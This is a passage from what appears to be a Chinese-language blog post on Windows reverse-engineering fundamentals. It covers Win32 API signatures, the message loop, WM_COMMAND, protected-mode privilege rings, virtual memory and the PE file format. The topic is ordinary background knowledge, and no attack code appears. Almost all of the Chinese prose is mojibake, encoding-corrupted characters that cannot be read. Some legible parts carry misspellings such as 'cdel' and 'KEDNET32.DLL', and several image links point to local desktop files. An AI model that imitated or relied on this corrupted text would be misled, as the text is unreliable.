control</span></span><br><span class="line">  LPTSTR lpString,  <span class="comment">// text buffer</span></span><br><span class="line">  <span class="keyword">int</span> nMaxCount     <span class="comment">// maximum number of characters to copy</span></span><br><span class="line">)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h3 id="UINT-GetDlgItemIntå‡½æ•°"><a href="#UINT-GetDlgItemIntå‡½æ•°" class="headerlink" title="UINT GetDlgItemIntå‡½æ•°"></a><strong>UINT GetDlgItemIntå‡½æ•°</strong></h3><p>ï¼ˆå°†å¯¹è¯æ¡†ä¸­æŒ‡å®šæ§ä»¶çš„æ–‡æœ¬è½¬æ¢ä¸ºæ•´æ•°å€¼ï¼‰                                                     </p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UINT</span> GetDlgItemInt(</span><br><span class="line">  HWND hDlg,           <span class="comment">// handle to dialog box</span></span><br><span class="line">  <span class="type">int</span> nIDDlgItem,      <span class="comment">// control identifier</span></span><br><span class="line">  <span class="type">BOOL</span> *lpTranslated,  <span class="comment">// success state</span></span><br><span class="line">  <span class="type">BOOL</span> bSigned         <span class="comment">// signed or unsigned value</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="MessageBox"><a href="#MessageBox" class="headerlink" title="MessageBox"></a>MessageBox</h3><p>ï¼ˆè¿™ä¸ªAPIæ–¹æ³•ç”¨æ¥åˆ›å»ºã€æ˜¾ç¤ºã€æ“ä½œä¸€ä¸ªæ¶ˆæ¯æ¡†ã€‚å®ƒåŒ…å«å¯è®¾ç½®çš„æ¶ˆæ¯å†…å®¹ã€æ ‡é¢˜ï¼Œè¿˜å¯ä»¥æ·»åŠ é¢„å®šä¹‰çš„å›¾æ ‡ã€æ”¾ç½®æŒ‰é’®ï¼‰int </p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> MessageBox(</span><br><span class="line">  <span class="keyword">HWND</span> <span class="keyword">hWnd</span>,          <span class="comment">// handle to owner window</span></span><br><span class="line">  LPCTSTR lpText,     <span class="comment">// text in message box</span></span><br><span class="line">  LPCTSTR lpCaption,  <span class="comment">// message box title</span></span><br><span class="line">  UINT uType          <span class="comment">// message box style</span></span><br><span class="line">)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>NTæ¶æ„ä»å†…æ ¸åˆ°KERNEL32Â·USER32Â·GDI32éƒ½æ˜¯çº¯32ä½å®ç°ã€‚<br>NTæ¶æ„æ ‡å‡†å­—ç¬¦é›†é‡å¤´å¼€å‘ï¼Œç»Ÿä¸€ä½¿ç”¨Unicodeå­—ç¬¦é›†Â·å…¼å®¹ASCIIå­—ç¬¦é›†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/R~%60]HZH%7BDN_P3NYJL1V@MSF.png" alt="img"></p><p>åŒºåˆ«ï¼š1.å‡½æ•°è°ƒç”¨å®Œåè°æ¥æ¸…ç©ºæ ˆ2.å…¥æ ˆé¡ºåºï¼ˆä¸¤è€…å‡è‡ªå³å‘å·¦ï¼‰stdcallç”±å­ç¨‹åºå¹³è¡¡æ ˆ cdelï¼ˆcè¯­è¨€æ ‡å‡†ï¼‰ç”±è°ƒç”¨å€¼å¹³è¡¡æ ˆå›è°ƒå‡½æ•°ã€‚ï¼ˆcallbackï¼‰å›è°ƒå‡½æ•°</p><p><img src="D:\Users\lenovo\Desktop\5.png"></p><p><img src="D:\Users\lenovo\Desktop\4.png"></p><p>Windowsæ“ä½œç³»ç»Ÿæœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯å…¶å›¾å½¢åŒ–çš„æ“ä½œåªé¢å’Œå¤šä»»åŠ¡çš„ç®¡ç†ã€‚è¿™äº›å¼ºå¤§åŠŸèƒ½å°±æ˜¯å»ºç«‹åœ¨å…¶æ¶ˆæ¯å¤„ç†æœºåˆ¶è¿™ä¸ªåŸºç¡€ä¹‹ä¸Šçš„ã€‚Windowsç³»ç»Ÿä¸åº”ç”¨ç¨‹åºä¹‹é—´ï¼Œåº”ç”¨ç¨‹åºä¸åº”ç”¨ç¨‹åºä¹‹é—´çš„é€šè®¯å°±æ˜¯é€šè¿‡æ¶ˆæ¯æ¥è§¦å‘ï¼Œå¹¶é å¯¹æ¶ˆæ¯çš„å“åº”å’Œå¤„ç†æ¥å®Œæˆã€‚<br>Windowsç³»ç»Ÿä¸­æœ‰ä¸¤ç§æ¶ˆæ¯é˜Ÿåˆ—:ä¸€ç§æ˜¯<strong>ç³»ç»Ÿæ¶ˆæ¯é˜Ÿåˆ—</strong>ï¼Œå¦ä¸€ç§æ˜¯<strong>åº”ç”¨ç¨‹åºæ¶ˆæ¯é˜Ÿåˆ—</strong>ã€‚Windowsæœ¬èº«æ˜¯ç”±æ¶ˆæ¯é©±åŠ¨ï¼Œå½“è°ƒè¯•ç¨‹åºæ—¶è·Ÿè¸ªä¸€ä¸ªæ¶ˆæ¯ä¼šå¾—åˆ°ç›¸å½“åº•å±‚çš„ç­”æ¡ˆã€‚                                                                        Windowsä¸ºå½“å‰æ‰§è¡Œçš„æ¯ä¸ªWindowsç¨‹åºç»´æŠ¤ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ã€‚<u>åœ¨å‘ç”ŸæŸäº‹ä»¶ä¹‹åï¼Œç³»ç»Ÿå°†è¯¥äº‹ä»¶è½¬æ¢ä¸ºä¸€ä¸ªæ¶ˆæ¯ï¼Œå¹¶å°†æ¶ˆæ¯æŠ•æ”¾å…¥ç¨‹åºæ¶ˆæ¯é˜Ÿåˆ—ä¸­ã€‚</u>ç¨‹åºé€šè¿‡iè¡Œä¸€å—ç§°ä¹‹ä¸ºæ¶ˆæ¯å¾ªç¯çš„ç¨‹åºä»£ç ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­å–å‡ºæ¶ˆæ¯!å…¶å®âˆ¶<strong>æ¶ˆæ¯ä¸è¿‡æ˜¯å®šä¹‰ä¸€ä¸ªç»“æ„ã€‚å®šä¹‰ä¸€å †IDï¼Œåœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­è°ƒç”¨switch caseæ‹¦æˆªå»å®Œæˆå·³åº”çš„åŠŸèƒ½ã€‚</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">while</span>(GetMessage (&amp;msg, NULL,<span class="number">0</span>,<span class="number">0</span>))                               &#123;TranslateMessage (&amp;msg);<span class="comment">//ç¿»è¯‘æ¶ˆæ¯</span></span><br><span class="line">DispatchMessage (&amp;msg); &#125;<span class="comment">//åˆ†é…æ¶ˆæ€»</span></span><br></pre></td></tr></table></figure><p><strong>SendMessageå‡½æ•°</strong>                                                                                å°†æŒ‡å®šçš„æ¶ˆæ¯å‘é€åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªçª—å£ã€‚</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LRESULT [SendMessage]ï¼ˆ<span class="keyword">HWND</span> <span class="keyword">hWnd</span>ï¼ŒUINT Msgï¼Œ<span class="keyword">WPARAM</span> <span class="keyword">wParam</span>ï¼Œ<span class="keyword">LPARAM</span> <span class="keyword">IParam</span>ï¼‰ï¼›</span><br></pre></td></tr></table></figure><h3 id="WM-COMMAND"><a href="#WM-COMMAND" class="headerlink" title="WM_COMMAND"></a><strong>WM_COMMAND</strong></h3><p>äº§ç”Ÿçš„æ¡ä»¶ï¼šç‚¹å‡»<strong>èœå•</strong>ï¼Œ ç‚¹å‡»<strong>åŠ é€Ÿé”®</strong>ï¼ˆé”®ç›˜å¿«æ·é”®ï¼Œæ˜¯ä¸€ä¸ªæˆ–å‡ ä¸ªæŒ‰é”®çš„ç»„åˆï¼Œå®ƒç”¨äºæ¿€æ´»ç‰¹å®šçš„å‘½ä»¤ï¼Œä½¿ç”¨åŠ é€Ÿé”®ä¸éœ€è¦è´¹åŠ›ç§»åŠ¨é¼ æ ‡å°±èƒ½æ¿€æ´»èœå•é¡¹ï¼‰ï¼Œç‚¹å‡»çª—å£<strong>æŒ‰é’®</strong>ï¼Œç‚¹å‡»<strong>å·¥å…·æ æŒ‰é’®</strong>ã€‚è¿™äº›æ—¶å€™éƒ½æœ‰commandæ¶ˆæ¯äº§ç”Ÿã€‚<br> wParam é«˜ä¸¤ä¸ªå­—èŠ‚ é€šçŸ¥ç <br>wParam ä½ä¸¤å­—èŠ‚ å‘½ä»¤ID<br>lParam å‘é€å‘½ä»¤æ¶ˆæ¯çš„å­çª—ä½“å¥æŸ„ã€‚<br> <strong>WM_GETTEXT</strong><br> <strong>WM_QUIT</strong><br><strong>WM_LBUTTONDOWN</strong><br><strong>WM_RBUTTONUP</strong><br><strong>WM_KEYUP</strong><br>ï¼ˆå¯è‡ªè¡ŒæŸ¥è¯¢ç›¸åº”ç”¨æ³•åŠä½œç”¨ æˆ‘ä¹Ÿæ˜¯å¤§æ‡’è™«æã€ğŸ˜€ã€‘ï¼‰</p><h3 id="å®æ¨¡å¼"><a href="#å®æ¨¡å¼" class="headerlink" title="å®æ¨¡å¼"></a><strong>å®æ¨¡å¼</strong></h3><p>ç¨‹åºæŒ‡ä»¤åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¸€èˆ¬éœ€è¦æœ‰å„ç§æ•°æ®,x86ç³»åˆ—CSã€DSã€ESã€FSã€SSç­‰ç”¨äºæŒ‡ç¤ºä¸åŒç”¨æ¶‚çš„æ•°æ®æ®µåœ¨å†…å­˜ä¸­çš„ä½ç½®ã€‚<br>x86ç³»åˆ—ä½¿ç”¨ä¸­æ–­æœºåˆ¶æ¥å®ç°ç³»ç»ŸæœåŠ¡ã€‚<br>å¯„å­˜å™¨çš„æ‰©å±•ä¹‹è·¯âˆ¶<br>8086ä»¥å‰ï¼ˆ 8bitï¼‰ -&gt;8086ï¼ˆ 16bitï¼‰ -&gt;80386(32bit)-&gt;ç°åœ¨çš„64bitCPU</p><p>å¯„å­˜å™¨ï¼ˆAL) -&gt;(AX)-&gt;ï¼ˆEAXï¼‰-&gt;(RAX)                                                         </p><h3 id="ä¿æŠ¤æ¨¡å¼âˆ¶æ— è®ºå®æ¨¡å¼è¿˜æ˜¯ä¿æŠ¤æ¨¡å¼æ ¹æœ¬çš„é—®é¢˜éƒ½ä¸ºç¨‹åºå¦‚ä½•åœ¨å…¶ä¸­è¿è¡Œã€‚"><a href="#ä¿æŠ¤æ¨¡å¼âˆ¶æ— è®ºå®æ¨¡å¼è¿˜æ˜¯ä¿æŠ¤æ¨¡å¼æ ¹æœ¬çš„é—®é¢˜éƒ½ä¸ºç¨‹åºå¦‚ä½•åœ¨å…¶ä¸­è¿è¡Œã€‚" class="headerlink" title="ä¿æŠ¤æ¨¡å¼âˆ¶æ— è®ºå®æ¨¡å¼è¿˜æ˜¯ä¿æŠ¤æ¨¡å¼æ ¹æœ¬çš„é—®é¢˜éƒ½ä¸ºç¨‹åºå¦‚ä½•åœ¨å…¶ä¸­è¿è¡Œã€‚"></a><strong>ä¿æŠ¤æ¨¡å¼</strong>âˆ¶æ— è®ºå®æ¨¡å¼è¿˜æ˜¯ä¿æŠ¤æ¨¡å¼æ ¹æœ¬çš„é—®é¢˜éƒ½ä¸ºç¨‹åºå¦‚ä½•åœ¨å…¶ä¸­è¿è¡Œã€‚</h3><p>å’Œå®æ¨¡å¼ä¸‹ä¸€æ ·ï¼Œä¿æŠ¤æ¨¡å¼ä¸‹ç¨‹åºè¿è¡Œçš„å®è´¨ä»æ˜¯â€œCPUæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ“ä½œç›¸å…³æ•°æ®â€ã€‚ä¸»è¦æ”¹å˜çš„æ˜¯å¯»å€çš„æ–¹å¼ï¼Œä¿æŠ¤æ¨¡å¼åœ¨å¯»å€æ–¹å¼ä¸Šâ€œåŠ¨äº†æ‰‹è„šâ€â€ï¼Œä¸ºçš„æ˜¯èµ·åˆ°â€œä¿æŠ¤ä½œç”¨â€ã€‚</p><p><strong>ä¿æŠ¤æ¨¡å¼</strong><br><u>ä¸€.ä¸åŒä»»åŠ¡ä¹‹é—´çš„ä¿æŠ¤âˆ¶</u><br>é€šè¿‡æŠŠæ¯ä¸ªä¸åŒçš„ä»»åŠ¡æ”¾åœ¨ä¸åŒçš„è™šæ’åœ°å€ç©ºé—´ä¸­ï¹æ¥å®ç°ä¸åŒä»»åŠ¡ä¹‹é—´çš„éš”ç¦»ï¼ˆå³Aç¨‹åºä¸èƒ½è®¿é—®å’Œä¿®æ”¹Bç¨‹åºçš„ä»£ç å’Œæ•°æ®ï¼‰Â·ä»¥è¾¾åˆ°ç¨‹åºé—´çš„éš”ç¦»;<br><u>äºŒ.åŒä¸€ä»»åŠ¡çš„ä¿æŠ¤âˆ¶</u><br>åœ¨æ¯ä¸€ä»»åŠ¡ä¹‹å†…å®šä¹‰äº†4ç§ä¿æŠ¤çº§åˆ«Â·æ–¹åˆ«ä¸º0ï¼Œ1ï¼Œ2ï¼Œ3æŒ‰ç¯çš„æ–¹å¼è¡¨ç¤º.</p><p><img src="D:\Users\lenovo\Desktop\3.jpg"></p><p>å…¶ä¸­ï¼Œ0çº§ä»£è¡¨æœ€é«˜çš„æƒé™çº§åˆ«ï¼Œ3çº§ä»£è¡¨æœ€ä½æƒé™çº§åˆ«ã€‚æŒ‰ç¯çš„æ–¹å¼æ¥è¡¨ç¤ºã€‚å…¶ä¸­ï¼Œç¯0ã€1ã€2ä¸ºç³»ç»Ÿçº§ï¼Œç¯3ä¸ºç”¨æˆ·çº§ã€‚<br>ä¸€èˆ¬çš„ç³»ç»Ÿåªèƒ½ä½¿ç”¨ç¯0å’Œç¯3ä¸¤ä¸ªçº§åˆ«ã€‚                                             å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæœ€å¤–å±‚çš„CodeAP1åªèƒ½è®¿é—®DataAP1ã€‚ä¸èƒ½è®¿é—®åŒçº§çš„å¦ä¸€åº”ç”¨ç¨‹åºçš„DataAP2;åŒæ ·Â·CodeAP2åªèƒ½è®¿i6DataAP2 ä¸èƒ½è®¿DataAP1 ã€‚                                                                                            è¦è¯´æ˜çš„æ˜¯ï¼š<strong>å¦‚æœåº”ç”¨ç¨‹åºæ‹¥æœ‰ç¬¬0çº§çš„æƒé™ï¼Œé‚£ä¹ˆå®ƒå°±å¯ä»¥æ‰§è¡Œæ‰€æœ‰çš„æŒ‡ä»¤å¹¶è®¿é—®æ‰€æœ‰çš„æ•°æ®ã€‚</strong><br>å¦‚æœåº”ç”¨ç¨‹åºæ‹¥æœ‰çš„æƒé™çº§åˆ«æ˜¯ç¬¬3çº§ï¼Œå®ƒæ‰§è¡Œçš„æŒ‡ä»¤æ˜¯æœ‰é™çš„ï¼Œèƒ½è®¿é—®çš„æ•°æ®ä¹Ÿæ˜¯æœ‰é™çš„ï¼ˆè¢«ä¿æŠ¤)  ã€‚                                                                           æ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒå±‚æ˜¯è¿è¡Œåœ¨Ring 0çº§ã€‚<br>WIN32å­ç³»ç»Ÿï¼ˆKEDNET32.DLL ã€å†…å­˜çš„ç®¡ç†ã€‘USER32.DLLã€æ“ä½œç”¨æˆ·çš„ç•Œé¢ã€‘ ï¼ŒGDI32.DLLã€æ“ä½œå›¾åƒçš„ç•Œé¢ã€‘ç­‰ï¼‰æ˜¯è¿è¡Œåœ¨Ring3çº§çš„ï¼Œä»¥æä¾›ä¸å­ç¨‹åºçš„æ¥å£ã€‚</p><h3 id="è™šæ‹Ÿå†…å­˜ï¼ˆç¡®å®å­˜åœ¨äºç¡¬ç›˜ä¸­ï¼‰âˆ¶"><a href="#è™šæ‹Ÿå†…å­˜ï¼ˆç¡®å®å­˜åœ¨äºç¡¬ç›˜ä¸­ï¼‰âˆ¶" class="headerlink" title="è™šæ‹Ÿå†…å­˜ï¼ˆç¡®å®å­˜åœ¨äºç¡¬ç›˜ä¸­ï¼‰âˆ¶"></a><strong>è™šæ‹Ÿå†…å­˜ï¼ˆ</strong>ç¡®å®å­˜åœ¨äºç¡¬ç›˜ä¸­ï¼‰âˆ¶</h3><p>è™šæ‹Ÿå†…å­˜å¹¶ä¸æ˜¯çœŸæ­£çš„å†…å­˜Â·å®ƒæ˜¯é€šè¿‡å°„( Mapï¼‰çš„æ–¹æ³•ï¹ä½¿ç”¨çš„è™šæ‹Ÿåœ°å€ï¼ˆVA)è¾¾åˆ°4GBï¼ˆå› ä¸ºEIP32ä½ç´¢å¼•çš„æœ€å¤§èŒƒå›´æ˜¯4GBï¼‰ã€‚<br>è¿™æ ·è§„å®šï¸°æ¯ä¸ªåº”ç”¨ç¨‹åºå¯ä»¥è¢«åˆ†é…åˆ°2GBçš„è™šæ‹Ÿåœ°å€Â·å‰©ä¸‹çš„2GBç•™ç»™æ“ä½œç³»ç»Ÿè‡ªå·±ç”¨ã€‚( Windows NTä¸­Â·åº”ç”¨ç¨‹åºç”šè‡³æœ‰3GBä¸ºè™šæ‹Ÿåœ°å€ )    </p><p>Windowsæ˜¯ä¸€ä¸ªåˆ†æ—¶çš„å¤šä»»åŠ¡æ“ä½œç³»ç»ŸÂ·CPUçš„æ—¶é—´è¢«åˆ†å‰²æˆä¸€ä¸ªä¸ªçš„æ—¶é—´ç‰‡åè¡Œé…ç»™åä¸ªä¸åŒçš„åº”ç”¨ç¨‹åºÂ·åœ¨ä¸€ä¸ªæ—¶é—´ç‰‡é‡Œï¼Œå’Œè¿™ä¸ªåº”ç”¨ç¨‹åºæŠ¤è¡Œæ— å…³çš„ä¸œè¥¿å¹¶ä¸ä¼šåˆæ˜ å°„åˆ°çº¿æ€§åœ°å€ä¸­ï¼ˆè¿™æ ·EIPå°±ç´¢å¼•ä¸åˆ°ï¼‰ã€‚</p><p>å› æ¯”å¯ä»¥åšåˆ°æ¯ä¸ªç¨‹åºéƒ½æ‹¥æœ‰è‡ªå·±ç‹¬ç«‹çš„4GBå¯»å€ç©ºé—´Â·äº’ä¸å¹²æ‰°ã€‚</p><p>è¦è¯´æ˜çš„æ˜¯DLLä¸EXEä¸åŒã€dllæ–‡ä»¶æ— è‡ªå·±çš„ç§æœ‰ç©ºé—´(åŠ¨æ€é“¾æ¥æ–‡ä»¶ï¼‰ã€‘</p><h4 id="ç®€å•çš„è™šæ‹Ÿå†…å­˜çš„å®ç°æ–¹æ³•å’Œè¿‡ç¨‹âˆ¶"><a href="#ç®€å•çš„è™šæ‹Ÿå†…å­˜çš„å®ç°æ–¹æ³•å’Œè¿‡ç¨‹âˆ¶" class="headerlink" title="ç®€å•çš„è™šæ‹Ÿå†…å­˜çš„å®ç°æ–¹æ³•å’Œè¿‡ç¨‹âˆ¶"></a><strong>ç®€å•çš„è™šæ‹Ÿå†…å­˜çš„å®ç°æ–¹æ³•å’Œè¿‡ç¨‹âˆ¶</strong></h4><p>1.å½“ä¸€ä¸ªåº”ç”¨ç¨‹åºè¢«å¯åŠ¨æ—¶ï¼Œæ“ä½œç³»ç»Ÿåˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œå¹¶ç»™è¿™ä¸ªè¿›ç¨‹è¡Œé…2GBçš„è™šæ‹Ÿåœ°å€ï¼ˆä¸æ˜¯å†…å­˜å“¦ æ˜¯åœ°å€)ã€‚<br>2.è™šæ‹Ÿå†…å­˜ç®¡ç†å™¨å°†åº”ç”¨ç¨‹åºçš„ä»£ç å°„åˆ°å“ªä¸ªç¨‹åºçš„è™šæ‹Ÿåœ°å€ä¸­çš„æŸä¸ªä½ç½®ï¼Œå¹¶æŠŠå½“å‰æ‰€éœ€è¦çš„ä»£ç è¯»å–åˆ°å†…å­˜ç‰©ç†åœ°å€ä¸­ã€‚<br>3.å¦‚æœç”¨åŠ¨æ€é“¾æ¥åº“DLLï¼ŒDLLç¨‹åºä¹Ÿä¼šè¢«æ˜ å°„åˆ°è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºié—´åœ¨éœ€è¦çš„æ—¶å€™æ‰è¢«è¯»å…¥ç‰©ç†å†…å­˜ã€‚<br>4.å…¶ä»–é¡¹ç›®(åƒæ•°æ®ï¹‘å †æ ˆç­‰)çš„ç©ºé—´æ˜¯é¦–å…ˆä»ç‰©ç†å†…å­˜ä¸­è¡Œé…ï¼Œå†åå‘æ˜ å°„åˆ°è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„ã€‚<br>5.åº”ç”¨ç¨‹åºé€šè¿‡ä½¿ç”¨çš„ä»–çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„åœ°å€å¼€å§‹æ‰§è¡ŒÂ·ç„¶åç”±è™šæ‹Ÿå†…å­˜ç®¡ç†å™¨æŠŠæ¯æ¬¡çš„å†…å­˜è®¿é—®æ˜ å°„åˆ°ç‰©ç†ä½ç½®å»ã€‚</p><h3 id="å°ç»“ï¼š"><a href="#å°ç»“ï¼š" class="headerlink" title="å°ç»“ï¼š"></a><strong>å°ç»“ï¼š</strong></h3><p>ä¸€.åº”ç”¨ç¨‹åºæ˜¯ä¸ä¼šç›´æ¥è®¿ié—®ç‰©ç†åœ°å€çš„ã€‚<br>äºŒ.è™šæ‹Ÿå†…å­˜ç®¡ç†å™¨é€šè¿‡è™šæ‹Ÿåœ°å€çš„è®¿é—®è¯·æ±‚ï¼Œæ§åˆ¶æ‰€æœ‰çš„ç‰©ç†åœ°å€è®¿é—®ï¼›<br>ä¸‰.æ¯ä¸ªç¨‹åºéƒ½æœ‰ç‹¬ç«‹çš„4Gå¯»å€ç©ºé—´Â·ä¸åŒç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´æ˜¯è¢«äº’ç›¸éš”ç¦»çš„;                                                                                                          å››.DLLç¨‹åºæ²¡æœ‰å·¨å·±çš„â€œç§æœ‰â€ç©ºé—´Â·å®ƒä»¬ç§°ä¹‹ä¸ºåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶Â·å®ƒä»¬æ€»æ˜¯è¢«å°„åˆ°å…¶ä»–åº”ç”¨ç¨‹åºçš„åœ°å€ç©ºé—´ä¸­çš„ï¹ä½œä¸ºå…¶ä»–åº”ç”¨ç¨‹åºçš„ä¸€éƒ¨è¡Œè¿è¡Œã€‚<br>æœ€åï¼Œä½¿ç”¨è™šæ‹Ÿå†…å­˜çš„å¥½å¤„æ˜¯ï¸°ç®€åŒ–äº†å†…å­˜çš„ç®¡ç†ï¼Œå¹¶å¼¥è¡¥ç‰©ç†å†…å­˜çš„ä¸è¶³ã€‚å¦å¤–ä»¥é˜²æ­¢å¤šä»»åŠ¡ç¯å¢ƒä¸‹å„ä¸ªåº”ç”¨ç¨‹åºä¹‹é—´çš„å†²çª!</p><h3 id="PEæ–‡ä»¶"><a href="#PEæ–‡ä»¶" class="headerlink" title="PEæ–‡ä»¶"></a><strong>PEæ–‡ä»¶</strong></h3><p>PEçš„æ„æ€å°±æ˜¯Portable Executable ï¼ˆå¯ç§»æ¤çš„æŒ–è¡Œä½“)ã€‚å®ƒæ˜¯Windowsç¯å¢ƒèº«æ‰€å¸¦çš„eè¡Œä½“æ–‡ä»¶æ ¼å¼ã€‚<br>å®ƒçš„ä¸€äº›ç‰¹æ€§ç»§æ‰¿ç”±Unix Coff (commonobject file format)æ–‡ä»¶æ ¼å¼ã€‚<br>â€œportable executableâ€ï¼ˆå·±ç§»æ¤çš„æ‰§è¡Œä½“ï¼‰æ„å‘³ç€æ­¤æ–‡ä»¶æ ¼å¼æ˜¯è·¨win32å¹³å°çš„:ä¹Ÿå°±æ˜¯è¯´å³ä½¿Windows è¿è¡Œåœ¨éIntelCPU ä¸ŠÂ·ä»»æ„win32å¹³å°çš„PEè£…è½½å™¨éƒ½èƒ½è¯†åˆ«å’Œä½¿ç”¨è¯¥æ–‡ä»¶æ ¼å¼ã€‚</p><p>åŸºæœ¬ä¸Šæ‰€æœ‰win32æ‰§è¡Œä½“(é™¤äº†VxDå’Œ16ä½çš„DI)éƒ½ç”¨PEæ–‡ä»¶æ ¼å¼ï¼ŒåŒ…æ‹¬NTçš„å†…æ ¸æ¨¡å¼é©±åŠ¨ç¨‹åº( kernel mode drivers ) ã€‚å› è€Œç ”ç©¶PEæ–‡ä»¶æ ¼å¼ç»™äº†æˆ‘ä»¬æ´æ‚‰ Windowsç»“æ„çš„è‰¯æœºã€‚<br>PEæ–‡ä»¶ç”¨çš„æ˜¯ä¸€ä¸ªå¹³é¢åœ°å€ç©ºé—´Â·æ‰€æœ‰ä»£ç å’Œæ•°æ®éƒ½åˆå¹¶åœ¨ä¸€èµ·Â·ç»„æˆä¸€ä¸ªå¾ˆå¤§ç»“æ„æ–‡ä»¶çš„å†…å®¹è¢«è¡Œå‰²ä¸ºä¸åŒçš„åŒºå—ï¼ˆSectionåˆç§°ä¸ºåŒºæ®µÂ·èŠ‚ç­‰)Â·å—ä¸­åŒ…å«ä»£ç æˆ–æ•°æ®ã€‚</p><p>æ¯ä¸ªåŒºå—éƒ½æœ‰å·¨å·±åœ¨å†…å­˜ä¸­çš„å±æ€§ï¼šå¯è¯»&#x2F;å†™Â·åªè¯»ç­‰ã€‚<br>æ¯ä¸ªåŒºå—éƒ½æœ‰ä¸åŒçš„åå­—ï¼Œè¿™ç”¨åå­—ä¸»è¦ç”¨æ¥è¡¨ç¤ºåŒºå—åŠŸèƒ½ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230131171812728.png" alt="image-20230131171812728"></p><p>PEæ–‡ä»¶éå¸¸å¥½çš„ä¸€ä¸ªåœ°æ–¹å°±æ˜¯åœ¨ç£ç›˜ä¸Šçš„æ•°æ®ç»“æ„ä¸åœ¨å†…å­˜ä¸­çš„ç»“æ„æ˜¯ä¸€è‡´çš„ã€‚<br>å½“è‡³ç»Ÿè£…è½½ä¸€ä¸ªå·±iè¡Œæ–‡ä»¶åˆ°å†…å­˜ä¸­Â·ä¸»è¦å°±æ˜¯å°†ä¸€ä¸ªPEæ–‡ä»¶çš„æŸä¸€éƒ¨æ–¹æ˜ å°„åˆ°åœ°å€ç©ºé—´ä¸­Â·è¿™æ ·ï¹PEæ–‡ä»¶çš„æ•°æ®ç»“æ²Ÿåœ¨ç£ç›˜å’Œå†…å­˜ä¸­å°±æ˜¯ä¸€æ ·çš„äº†ã€‚</p><p><img src="D:\Users\lenovo\Desktop\1.png"></p><p>(1ï¼‰å…¥å£ç‚¹ï¼ˆEntry Pointï¼‰<br>PEæ–‡ä»¶å·³è¡Œæ—¶çš„å…¥å£ç‚¹ï¼ˆEntry Point) ã€‚ä¹Ÿå°±æ˜¯è¯´Â·ç¨‹åºåœ¨æ‰§è¡Œæ—¶çš„ç¬¬ä¸€è¡Œä»£ç åœ°å€åº”è¯¥å°±æ˜¯è¿™ä¸ªå€¼Â·æœ‰ç‚¹åƒ8086æ±‡ç¼–è¯­è¨€ä¸­end startä¸­startæŒ‡å‘çš„å…¥å£åœ°å€ã€‚<br>(2ï¼‰æ–‡ä»¶åç§»åœ°å€ï¼ˆFile Offsetï¼‰<br>å½“PEæ–‡ä»¶å‚¨å­˜åœ¨ç£ç›˜ä¸Šçš„æ—¶å€™Â·å„æ•°æ®çš„åœ°å€ç§°ä½œæ–‡ä»¶çš„ç§»åœ°å€Â·æ–‡ä»¶åç§»åœ°å€äººPEæ–‡ä»¶çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¼€å§‹è®¡æ•°Â·èµ·å§‹å€¼ä¸º0ã€‚</p><h3 id="è™šåœ°åœ°å€-Virtual-Address-VA"><a href="#è™šåœ°åœ°å€-Virtual-Address-VA" class="headerlink" title="è™šåœ°åœ°å€(Virtual Address, VA)"></a><strong>è™šåœ°åœ°å€(Virtual Address, VA)</strong></h3><p>ç”±äºWindowsç¨‹åºè¿è¡Œåœ¨ä¿æŠ¤æ¨¡å¼ä¸‹Â·æ‰€ä»¥åº”ç”¨ç¨‹åºè®¿é—®å­˜å‚¨å™¨æ‰€ä½¿ç”¨çš„é€»è¾‘åœ°å€ç§°ä¸ºè™šæ‹Ÿåœ°å€ï¼ˆå› ä¸ºä»–ä¸æ˜¯çœŸæ­£çš„ç‰©ç†åœ°å€Â·çœŸæ­£çš„ç‰©ç†åœ°å€è¢«windowså¦ˆå¦ˆçš„ä¿æŠ¤æœºåˆ¶ä¿æŠ¤èµ·æ¥)ï¹åˆç§°ä¸ºå†…å­˜åç§»åœ°å€ï¼ˆMemory Offset) ã€‚å®åœ°å€æ¨¡å¼ä¸‹çš„â€œæ®µå€ä¹Ÿå†™åœ°å€âˆ¶åç§»åœ°å€ç´¢å¼•æ–¹å¼ç±»ä¼¼Â·è™šæ¨½åœ°;æˆâ€œæ®µâˆ¶åç§»é‡â€çš„å½¢å¼Â·ä½†ä¸åŒä¹‹å¤„åœ¨äºè¿™é‡Œçš„æ®µä¸å†æ˜¯æ®µåœ°åˆ‡è€Œæ˜¯æŒ‡æ®µé€‰æ‹©å­ã€‚<br>ä¾‹t :â€0123:004010003â€™<br>0123âˆ¶è¡¨ç¤ºæ®µé€‰æ‹©å­ã€‚å…¶æ•°æ®å­˜å‚¨åœ¨CSæ®µé€‰æ‹©å™¨é‡Œã€‚åŒä¸€ç¨‹åºåœ¨ä¸åŒç³»ç»Ÿç¯å¢ƒä¸‹æ­¤å€¼å¯èƒ½ä¸åŒï¼Œå› 